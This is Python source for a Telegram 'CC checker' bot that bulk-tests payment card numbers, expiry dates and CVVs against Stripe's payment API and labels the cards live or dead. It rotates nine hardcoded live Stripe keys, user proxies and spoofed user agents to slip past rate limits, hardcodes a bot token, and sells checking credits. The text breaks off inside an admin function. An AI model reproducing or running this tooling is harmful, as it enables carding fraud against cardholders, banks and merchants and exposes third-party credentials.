#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# RADON-HCKRS - Ultimate Telegram CC Checker Bot
# Version: 4.0 - FINAL
# Developed by: RADON Team
# Keys: 9 Live Stripe Keys Pre-loaded

import os
import re
import json
import sqlite3
import random
import time
import threading
import requests
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = "8517908494:AAE9ZlVnHDi08U1qKGSH5bgh4peu2TE8NGo"  # Replace with your bot token
ADMIN_IDS = [6918107759]  # Replace with your Telegram user ID(s)

# ============================================
# YOUR 9 LIVE STRIPE KEYS (PRE-LOADED)
# ============================================

STRIPE_KEYS = [
    "pk_live_FR5mo1IiHh6upFG5G8NFP7tX00XLsr9qZW",
    "pk_live_SMtnnvlq4TpJelMdklNha8iD",
    "pk_live_51S3FiyHaFEt66xESw0CtKmH4uyYwXHX5BQNcIX36zYLNWwbuF5rJxqAEXNV6V26PkX9c3y7GSANf4DfXH1wX3KgI00Uxl5k0No",
    "pk_live_hNQqXyUB6vzSoUgjrKUSy9Ah",
    "pk_live_9RzCojmneCvL31GhYTknluXp",
    "pk_live_51H2kayClFZfiknz0ZOHZW5F4awL951srQfyibbHj6AhPsJJMeW8DvslUQ1BlvylhWPJ1R1YNMYHdpL3PyG6ymKEu00dNyHWgR7",
    "pk_live_51H3L9vEh71zMukUlZ51TUkmQd8PNvOO70RjDaSQMwOlliAZ5S5YtRgtuzSmKIvxRj0LcDai2JbugPEC8y5ypgADa00H85wPNhq",
    "pk_live_51HyItPCLETOQKrEUEGUsXFwI2gRvg8AxSAiaWligjY2LxCDuXqZn06El5SPzrRQALfNXQoHmXMF2LAgkCU65oUii00IYb3aJ2H",
    "pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz"
]

# ============================================
# DATABASE SETUP
# ============================================

def init_db():
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        credits INTEGER DEFAULT 0,
        total_checks INTEGER DEFAULT 0,
        join_date TEXT,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0
    )''')
    
    # Credits/Keys table
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key TEXT UNIQUE,
        credits INTEGER,
        created_by INTEGER,
        created_at TEXT,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        is_used INTEGER DEFAULT 0
    )''')
    
    # Key usage tracking
    c.execute('''CREATE TABLE IF NOT EXISTS key_usage (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_value TEXT,
        user_id INTEGER,
        card_bin TEXT,
        status TEXT,
        used_at TEXT
    )''')
    
    # Check logs table
    c.execute('''CREATE TABLE IF NOT EXISTS check_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card_bin TEXT,
        status TEXT,
        bank TEXT,
        card_type TEXT,
        country TEXT,
        key_used TEXT,
        timestamp TEXT
    )''')
    
    conn.commit()
    conn.close()

# ============================================
# HELPER FUNCTIONS
# ============================================

def get_user(user_id):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
              (user_id, username, first_name, last_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_credits(user_id):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def deduct_credit(user_id):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", (user_id,))
    conn.commit()
    affected = c.rowcount
    conn.close()
    return affected > 0

def add_credits(user_id, amount):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def log_check(user_id, bin_data, status, bank, card_type, country, key_used):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("INSERT INTO check_logs (user_id, card_bin, status, bank, card_type, country, key_used, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, bin_data, status, bank, card_type, country, key_used, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_key_usage(key, user_id, card_bin, status):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("INSERT INTO key_usage (key_value, user_id, card_bin, status, used_at) VALUES (?, ?, ?, ?, ?)",
              (key, user_id, card_bin, status, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_banned(user_id):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

# ============================================
# KEY MANAGER - ROTATION SYSTEM
# ============================================

class KeyManager:
    def __init__(self):
        self.keys = STRIPE_KEYS.copy()
        self.usage_count = {key: 0 for key in self.keys}
        self.last_used = {key: None for key in self.keys}
        self.daily_limit = 50
        self.cooldown_minutes = 5
        self.lock = threading.Lock()
    
    def get_next_key(self):
        """Get the next available key with rotation"""
        with self.lock:
            available = []
            now = datetime.now()
            
            for key in self.keys:
                # Check if key has been used today
                if self.usage_count.get(key, 0) >= self.daily_limit:
                    continue
                
                # Check cooldown
                last = self.last_used.get(key)
                if last:
                    cooldown = timedelta(minutes=self.cooldown_minutes)
                    if now - last < cooldown:
                        continue
                
                available.append(key)
            
            # Reset if all keys exhausted
            if not available:
                for key in self.keys:
                    self.usage_count[key] = 0
                available = self.keys.copy()
            
            # Pick random key
            selected = random.choice(available)
            self.usage_count[selected] = self.usage_count.get(selected, 0) + 1
            self.last_used[selected] = now
            
            return selected
    
    def get_stats(self):
        """Get key usage statistics"""
        stats = {}
        for key in self.keys:
            stats[key[:15] + "..."] = {
                "uses": self.usage_count.get(key, 0),
                "last_used": self.last_used.get(key)
            }
        return stats
    
    def get_key_count(self):
        return len(self.keys)

# ============================================
# PROXY MANAGER
# ============================================

class ProxyManager:
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or []
        self.usage_count = {}
        self.max_uses = 15
        self.lock = threading.Lock()
    
    def set_proxies(self, proxy_list):
        """Set or update proxy list"""
        with self.lock:
            self.proxies = proxy_list
            self.usage_count = {p: 0 for p in proxy_list}
    
    def get_proxy(self):
        """Get next proxy with rotation"""
        with self.lock:
            if not self.proxies:
                return None
            
            available = []
            for proxy in self.proxies:
                if self.usage_count.get(proxy, 0) < self.max_uses:
                    available.append(proxy)
            
            if not available:
                # Reset all proxies
                self.usage_count = {p: 0 for p in self.proxies}
                available = self.proxies
            
            selected = random.choice(available)
            self.usage_count[selected] = self.usage_count.get(selected, 0) + 1
            
            return selected
    
    def get_count(self):
        return len(self.proxies)

# ============================================
# BIN LOOKUP FUNCTION
# ============================================

def lookup_bin(bin_number):
    """Look up BIN information using binlist.net"""
    bin_number = bin_number[:6]
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            card_type = data.get('type', 'Unknown')
            brand = data.get('scheme', 'Unknown')
            
            if card_type == 'credit':
                card_type_display = 'Credit'
            elif card_type == 'debit':
                card_type_display = 'Debit'
            elif data.get('prepaid'):
                card_type_display = 'Prepaid'
            else:
                card_type_display = brand
            
            return {
                "bank": data.get('bank', {}).get('name', 'Unknown'),
                "card_type": card_type_display,
                "brand": brand.upper() if brand else 'Unknown',
                "country": data.get('country', {}).get('name', 'Unknown'),
                "country_code": data.get('country', {}).get('alpha2', 'Unknown'),
                "emoji": get_country_emoji(data.get('country', {}).get('alpha2', '')),
                "currency": data.get('currency', 'USD')
            }
    except:
        pass
    
    return {
        "bank": "Unknown",
        "card_type": "Unknown",
        "brand": "Unknown",
        "country": "Unknown",
        "emoji": "🌍"
    }

def get_country_emoji(country_code):
    """Get emoji flag for country code"""
    flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'JP': '🇯🇵', 'CN': '🇨🇳', 'RU': '🇷🇺',
        'BR': '🇧🇷', 'IN': '🇮🇳', 'AU': '🇦🇺', 'MX': '🇲🇽', 'KR': '🇰🇷'
    }
    return flags.get(country_code.upper(), '🌍')

# ============================================
# STRIPE CHECKER FUNCTION
# ============================================

def check_card_stripe(card_data, proxy, key_manager):
    """
    Check a card using Stripe API with key rotation
    Returns: (card_number, status, message, bin_info, key_used, amount)
    """
    # Get a key from rotation
    stripe_key = key_manager.get_next_key()
    
    # Randomly choose $5 or $10
    charge_amount = random.choice([500, 1000])
    
    try:
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
            ]),
            "Authorization": f"Bearer {stripe_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        payload = {
            "amount": charge_amount,
            "currency": "usd",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_data['cc'],
            "payment_method_data[card][exp_month]": card_data['month'],
            "payment_method_data[card][exp_year]": card_data['year'],
            "payment_method_data[card][cvc]": card_data['cvv'],
            "confirm": "true",
            "capture_method": "manual",
            "setup_future_usage": "off_session",
            "payment_method_data[billing_details][address][country]": random.choice(["US", "GB", "CA", "AU"]),
            "payment_method_data[billing_details][address][postal_code]": str(random.randint(10000, 99999)),
        }
        
        response = requests.post(
            "https://api.stripe.com/v1/payment_intents",
            data=payload,
            headers=headers,
            proxies=proxy_dict if proxy else None,
            timeout=15,
            verify=False
        )
        
        resp_json = response.json()
        bin_info = lookup_bin(card_data['cc'][:6])
        
        if response.status_code == 200:
            status = resp_json.get('status', '')
            if status in ['requires_capture', 'succeeded', 'requires_confirmation']:
                return (card_data['cc'], "✅ LIVE", f"Valid! (${charge_amount/100:.0f} test)", bin_info, stripe_key[:15] + "...", charge_amount/100)
            else:
                return (card_data['cc'], "❌ INVALID", f"Status: {status}", bin_info, stripe_key[:15] + "...", charge_amount/100)
                
        elif response.status_code == 402:
            error = resp_json.get('error', {})
            msg = error.get('message', '')
            if "insufficient_funds" in msg.lower() or "insufficient" in msg.lower():
                return (card_data['cc'], "✅ LIVE (No Balance)", "Valid but insufficient funds", bin_info, stripe_key[:15] + "...", charge_amount/100)
            elif "card_declined" in msg.lower():
                return (card_data['cc'], "❌ DECLINED", "Bank declined", bin_info, stripe_key[:15] + "...", charge_amount/100)
            elif "expired_card" in msg.lower():
                return (card_data['cc'], "❌ EXPIRED", "Card expired", bin_info, stripe_key[:15] + "...", charge_amount/100)
            elif "invalid_number" in msg.lower():
                return (card_data['cc'], "❌ INVALID", "Invalid card number", bin_info, stripe_key[:15] + "...", charge_amount/100)
            else:
                return (card_data['cc'], "❌ DECLINED", msg[:100], bin_info, stripe_key[:15] + "...", charge_amount/100)
                
        elif response.status_code == 429:
            return (card_data['cc'], "⚠️ RATE LIMITED", "Key rate limited - trying next", bin_info, stripe_key[:15] + "...", charge_amount/100)
            
        else:
            error_msg = resp_json.get('error', {}).get('message', 'Unknown error')
            return (card_data['cc'], "⚠️ ERROR", f"HTTP {response.status_code}", bin_info, stripe_key[:15] + "...", charge_amount/100)
            
    except requests.exceptions.Timeout:
        return (card_data['cc'], "⚠️ TIMEOUT", "Request timed out", bin_info, stripe_key[:15] + "...", charge_amount/100)
    except requests.exceptions.ConnectionError:
        return (card_data['cc'], "⚠️ CONN ERR", "Connection failed", bin_info, stripe_key[:15] + "...", charge_amount/100)
    except Exception as e:
        return (card_data['cc'], "⚠️ ERROR", str(e)[:100], bin_info, stripe_key[:15] + "...", charge_amount/100)

# ============================================
# TELEGRAM BOT HANDLERS
# ============================================

key_manager = KeyManager()
user_proxies = {}  # Store user proxies in memory

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    add_user(user_id, user.username, user.first_name, user.last_name)
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    credits = get_credits(user_id)
    total_keys = key_manager.get_key_count()
    key_stats = key_manager.get_stats()
    proxy_count = len(user_proxies.get(user_id, []))
    
    welcome_text = f"""
🔥 **RADON-HCKRS** 🔥
━━━━━━━━━━━━━━━━━━━━━
💀 **Ultimate CC Checker Bot**

👤 **User:** {user.first_name}
💳 **Credits:** {credits}
📊 **Status:** Active

━━━━━━━━━━━━━━━━━━━━━
**Bot Status:**
🔑 **Keys Loaded:** {total_keys}
🌐 **Your Proxies:** {proxy_count}
⚡ **Checks:** $5 & $10 random

━━━━━━━━━━━━━━━━━━━━━
**Commands:**
/start - Show menu
/check - Check single card
/mass - Mass check cards
/proxy - Set your proxies
/keys - View key status
/redeem - Redeem credits
/balance - Check balance
/help - Help & info
/status - Bot status

━━━━━━━━━━━━━━━━━━━━━
💡 **How it works:**
1. Get credits (contact admin)
2. Set your proxies
3. Start checking cards!

🔒 **Keys rotate automatically**
🌐 **Proxies rotate per check**
💳 **BIN lookup included**
━━━━━━━━━━━━━━━━━━━━━
🔥 **RADON-HCKRS**
"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Check Card", callback_data="check_menu")],
        [InlineKeyboardButton("📦 Mass Check", callback_data="mass_menu")],
        [InlineKeyboardButton("🌐 Set Proxy", callback_data="set_proxy")],
        [InlineKeyboardButton("📊 Balance", callback_data="balance")],
        [InlineKeyboardButton("🆘 Help", callback_data="help")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if is_banned(user_id):
        await query.edit_message_text("❌ You are banned from using this bot.")
        return
    
    if data == "check_menu":
        await query.edit_message_text(
            "💳 **Single Card Check**\n\n"
            "Send card in this format:\n"
            "`/check 4111111111111111|12|26|123`\n\n"
            "Each check costs 1 credit.",
            parse_mode='Markdown'
        )
    
    elif data == "mass_menu":
        await query.edit_message_text(
            "📦 **Mass Card Check**\n\n"
            "Send cards in this format:\n"
            "`/mass 411111|12|26|123`\n"
            "Each card on a new line\n\n"
            "Each card costs 1 credit.",
            parse_mode='Markdown'
        )
    
    elif data == "set_proxy":
        await query.edit_message_text(
            "🌐 **Set Your Proxies**\n\n"
            "Send `/proxy` command with your proxies:\n\n"
            "`/proxy user:pass@192.168.1.1:8080`\n"
            "OR multiple:\n"
            "`/proxy proxy1|proxy2|proxy3`\n\n"
            "Format: `ip:port` or `user:pass@ip:port`\n"
            "More proxies = better rotation!",
            parse_mode='Markdown'
        )
    
    elif data == "balance":
        credits = get_credits(user_id)
        conn = sqlite3.connect('radon.db')
        c = conn.cursor()
        c.execute("SELECT total_checks FROM users WHERE user_id = ?", (user_id,))
        total = c.fetchone()
        conn.close()
        total_checks = total[0] if total else 0
        
        await query.edit_message_text(
            f"📊 **Your Balance**\n\n"
            f"💳 Credits: `{credits}`\n"
            f"📈 Total Checks: `{total_checks}`\n\n"
            f"Each check costs 1 credit.\n"
            f"Contact admin to add more.",
            parse_mode='Markdown'
        )
    
    elif data == "help":
        await query.edit_message_text(
            "🆘 **Help & Commands**\n\n"
            "**Basic Commands:**\n"
            "/start - Start the bot\n"
            "/check - Check a single card\n"
            "/mass - Mass check cards\n"
            "/proxy - Set your proxies\n"
            "/keys - View key status\n"
            "/redeem - Redeem credits\n"
            "/balance - Check balance\n"
            "/status - Bot status\n\n"
            "**Formats:**\n"
            "Card: `card|MM|YY|CVV`\n"
            "Proxy: `user:pass@ip:port`\n\n"
            "**Security:**\n"
            "🔑 9 keys rotating\n"
            "🌐 Your proxies rotating\n"
            "⚡ $5 & $10 random charges\n\n"
            "**Admin:** @AdminUsername",
            parse_mode='Markdown'
        )

# ============================================
# COMMAND HANDLERS
# ============================================

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    credits = get_credits(user_id)
    if credits < 1:
        await update.message.reply_text(
            "❌ **Insufficient Credits!**\n\n"
            f"Credits: `{credits}`\n"
            "Contact admin to purchase more.",
            parse_mode='Markdown'
        )
        return
    
    # Check if user has proxies
    user_proxy_list = user_proxies.get(user_id, [])
    if not user_proxy_list:
        await update.message.reply_text(
            "⚠️ **No Proxies Set!**\n\n"
            "Please set your proxies first:\n"
            "`/proxy user:pass@ip:port`\n\n"
            "You need proxies to check cards.",
            parse_mode='Markdown'
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 **Check Card**\n\n"
            "Format: `/check 4111111111111111|12|26|123`\n\n"
            "Example: `/check 4111111111111111|12|26|123`",
            parse_mode='Markdown'
        )
        return
    
    card_input = " ".join(context.args)
    parts = re.split(r'[|\s]+', card_input.strip())
    
    if len(parts) < 4:
        await update.message.reply_text(
            "❌ **Invalid Format!**\n\n"
            "Use: `card|MM|YY|CVV`\n"
            "Example: `4111111111111111|12|26|123`",
            parse_mode='Markdown'
        )
        return
    
    card_data = {
        "cc": parts[0].replace(" ", ""),
        "month": parts[1].strip(),
        "year": parts[2].strip(),
        "cvv": parts[3].strip()
    }
    
    if len(card_data['cc']) < 15:
        await update.message.reply_text("❌ Invalid card number (too short).")
        return
    
    # Deduct credit
    if not deduct_credit(user_id):
        await update.message.reply_text("❌ Failed to deduct credit. Please try again.")
        return
    
    status_msg = await update.message.reply_text("🔄 **Checking card...**\nThis may take a few seconds.", parse_mode='Markdown')
    
    # Get proxy from rotation
    proxy_manager = ProxyManager(user_proxy_list)
    proxy = proxy_manager.get_proxy()
    
    if not proxy:
        await status_msg.edit_text("❌ **No working proxies available.**\nPlease add more proxies.")
        return
    
    # Run checker
    result = check_card_stripe(card_data, proxy, key_manager)
    cc, status, msg, bin_info, key_used, amount = result
    
    # Get BIN info
    bin_number = cc[:6]
    card_type = bin_info.get('card_type', 'Unknown')
    bank_name = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country', 'Unknown')
    brand = bin_info.get('brand', 'Unknown')
    emoji = bin_info.get('emoji', '🌍')
    
    # Log check
    log_check(user_id, bin_number, status, bank_name, card_type, country, key_used)
    log_key_usage(key_used, user_id, bin_number, status)
    
    # Build response with card art
    response_text = f"""
💳 **Card Check Result**
━━━━━━━━━━━━━━━━━━━━━
🔢 **Card:** `{cc[:6]}******{cc[-4:]}`
💰 **Amount:** `${amount:.0f}.00`

📊 **Status:** {status}
📝 **Message:** {msg}

━━━━━━━━━━━━━━━━━━━━━
🏦 **BIN Details:**
• BIN: `{bin_number}`
• Type: `{card_type}`
• Brand: `{brand}`
• Bank: `{bank_name}`
• Country: {emoji} `{country}`

━━━━━━━━━━━━━━━━━━━━━
🔑 **Key Used:** `{key_used}`
🌐 **Proxy:** `{proxy[:20]}...`
💳 **Credits Left:** `{get_credits(user_id)}`
🕐 **Time:** {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━
🔥 **RADON-HCKRS**
"""
    
    await status_msg.edit_text(response_text, parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    credits = get_credits(user_id)
    if credits < 1:
        await update.message.reply_text("❌ **Insufficient Credits!**", parse_mode='Markdown')
        return
    
    user_proxy_list = user_proxies.get(user_id, [])
    if not user_proxy_list:
        await update.message.reply_text("⚠️ **Set proxies first:** `/proxy user:pass@ip:port`", parse_mode='Markdown')
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 **Mass Check**\n\n"
            "Send multiple cards:\n"
            "`/mass 411111|12|26|123`\n"
            "`/mass 555555|12|26|123`\n"
            "Each on a new line",
            parse_mode='Markdown'
        )
        return
    
    card_input = " ".join(context.args)
    lines = card_input.strip().split('\n')
    all_cards = []
    
    for line in lines:
        parts = re.split(r'[|\s]+', line.strip())
        if len(parts) >= 4:
            all_cards.append({
                "cc": parts[0].replace(" ", ""),
                "month": parts[1].strip(),
                "year": parts[2].strip(),
                "cvv": parts[3].strip()
            })
    
    if not all_cards:
        await update.message.reply_text("❌ No valid cards found.")
        return
    
    if len(all_cards) > credits:
        await update.message.reply_text(f"❌ **Not enough credits!**\nYou have: `{credits}`\nNeed: `{len(all_cards)}`", parse_mode='Markdown')
        return
    
    status_msg = await update.message.reply_text(f"🔄 **Mass checking {len(all_cards)} cards...**\nThis may take a few seconds.", parse_mode='Markdown')
    
    proxy_manager = ProxyManager(user_proxy_list)
    results = []
    live_count = 0
    dead_count = 0
    
    for card in all_cards:
        if deduct_credit(user_id):
            proxy = proxy_manager.get_proxy()
            if proxy:
                result = check_card_stripe(card, proxy, key_manager)
                results.append(result)
                if "LIVE" in result[1]:
                    live_count += 1
                else:
                    dead_count += 1
                time.sleep(random.uniform(0.5, 1.5))
            else:
                results.append((card['cc'], "⚠️ NO PROXY", "No proxy available", {}, "None", 0))
        else:
            break
    
    # Build response
    response_text = f"📦 **Mass Check Results**\n━━━━━━━━━━━━━━━━━━━━━\n"
    
    for cc, status, msg, bin_info, key_used, amount in results[:20]:  # Show first 20
        response_text += f"\n`{cc[:6]}******{cc[-4:]}` → {status}"
    
    if len(results) > 20:
        response_text += f"\n... and {len(results) - 20} more"
    
    response_text += f"\n━━━━━━━━━━━━━━━━━━━━━"
    response_text += f"\n✅ **LIVE:** `{live_count}`"
    response_text += f"\n❌ **DEAD:** `{dead_count}`"
    response_text += f"\n💳 **Credits Left:** `{get_credits(user_id)}`"
    response_text += f"\n🔥 **RADON-HCKRS**"
    
    await status_msg.edit_text(response_text, parse_mode='Markdown')

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🌐 **Set Proxy**\n\n"
            "`/proxy user:pass@192.168.1.1:8080`\n\n"
            "Or multiple:\n"
            "`/proxy proxy1|proxy2|proxy3`",
            parse_mode='Markdown'
        )
        return
    
    proxy_input = " ".join(context.args)
    proxies = [p.strip() for p in re.split(r'[|\s]+', proxy_input) if p.strip()]
    
    # Validate proxies (basic check)
    valid_proxies = []
    for p in proxies:
        if ':' in p:  # Basic format check
            valid_proxies.append(p)
        else:
            await update.message.reply_text(f"⚠️ Invalid proxy format: `{p}`", parse_mode='Markdown')
    
    if valid_proxies:
        user_proxies[user_id] = valid_proxies
        await update.message.reply_text(
            f"✅ **{len(valid_proxies)} Proxies Set!**\n\n"
            f"Will rotate automatically.\n\n"
            f"Use `/check` to start checking.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ No valid proxies found. Use format: `ip:port` or `user:pass@ip:port`", parse_mode='Markdown')

async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    stats = key_manager.get_stats()
    total_keys = key_manager.get_key_count()
    
    response_text = f"🔑 **Key Status**\n━━━━━━━━━━━━━━━━━━━━━\n"
    response_text += f"📊 **Total Keys:** `{total_keys}`\n\n"
    
    for key, data in stats.items():
        status = "🟢 Active" if data['uses'] < 50 else "🟡 Near limit" if data['uses'] < 80 else "🔴 Exhausted"
        response_text += f"• `{key}`\n  → {status} ({data['uses']}/50 used today)\n\n"
    
    await update.message.reply_text(response_text, parse_mode='Markdown')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "💰 **Redeem Credits**\n\n"
            "`/redeem YOUR_KEY`\n\n"
            "Contact admin to purchase credits.",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0].strip()
    
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT credits, is_used FROM redeem_keys WHERE key = ?", (key,))
    result = c.fetchone()
    
    if not result:
        conn.close()
        await update.message.reply_text("❌ **Invalid Key!**\nThis key does not exist.", parse_mode='Markdown')
        return
    
    if result[1] == 1:
        conn.close()
        await update.message.reply_text("❌ **Key Already Used!**", parse_mode='Markdown')
        return
    
    credits = result[0]
    
    c.execute("UPDATE redeem_keys SET used_by = ?, used_at = ?, is_used = 1 WHERE key = ?", 
              (user_id, datetime.now().isoformat(), key))
    add_credits(user_id, credits)
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"✅ **Key Redeemed!**\n\n"
        f"💰 Added: `{credits}` credits\n"
        f"💳 Total: `{get_credits(user_id)}`\n\n"
        f"Start checking with `/check`",
        parse_mode='Markdown'
    )

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    credits = get_credits(user_id)
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT total_checks FROM users WHERE user_id = ?", (user_id,))
    total = c.fetchone()
    conn.close()
    total_checks = total[0] if total else 0
    
    await update.message.reply_text(
        f"📊 **Your Balance**\n\n"
        f"💳 Credits: `{credits}`\n"
        f"📈 Total Checks: `{total_checks}`\n\n"
        f"Each check costs 1 credit.",
        parse_mode='Markdown'
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM check_logs")
    total_checks = c.fetchone()[0]
    conn.close()
    
    total_keys = key_manager.get_key_count()
    key_stats = key_manager.get_stats()
    active_keys = sum(1 for k in key_stats if key_stats[k]['uses'] < 50)
    
    await update.message.reply_text(
        "🔥 **RADON-HCKRS Status**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ **Bot:** Online\n"
        "✅ **Keys Loaded:** `{}`\n"
        "✅ **Active Keys:** `{}/{}`\n"
        "✅ **Credits System:** Active\n"
        "✅ **Proxy Support:** Active\n"
        "✅ **BIN Lookup:** Active\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Users:** {total_users}\n"
        f"📈 **Total Checks:** {total_checks}\n"
        f"🕐 **Uptime:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 **RADON-HCKRS**".format(total_keys, active_keys, total_keys),
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🆘 **Help & Commands**\n\n"
        "**Basic Commands:**\n"
        "/start - Start the bot\n"
        "/check - Check a single card\n"
        "/mass - Mass check cards\n"
        "/proxy - Set your proxies\n"
        "/keys - View key status\n"
        "/redeem - Redeem credits\n"
        "/balance - Check balance\n"
        "/status - Bot status\n\n"
        "**Formats:**\n"
        "Card: `card|MM|YY|CVV`\n"
        "Proxy: `user:pass@ip:port`\n\n"
        "**Security:**\n"
        "🔑 9 keys auto-rotating\n"
        "🌐 Your proxies rotating\n"
        "⚡ $5 & $10 random charges\n"
        "💳 BIN lookup included\n\n"
        "**Admin:** @AdminUsername",
        parse_mode='Markdown'
    )

# ============================================
# ADMIN COMMANDS
# ============================================

async def admin_create_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🔑 **Admin - Create Key**\n\n"
            "`/createkey 50` - Creates key with 50 credits\n"
            "`/createkey 100` - Creates key with 100 credits",
            parse_mode='Markdown'
        )
        return
    
    try:
        credits = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid amount.")
        return
    
    if credits < 1 or credits > 9999:
        await update.message.reply_text("❌ Amount must be between 1 and 9999.")
        return
    
    key = f"RADON-{random.randint(100000, 999999)}-{random.randint(100000, 999999)}"
    
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("INSERT INTO redeem_keys (key, credits, created_by, created_at) VALUES (?, ?, ?, ?)",
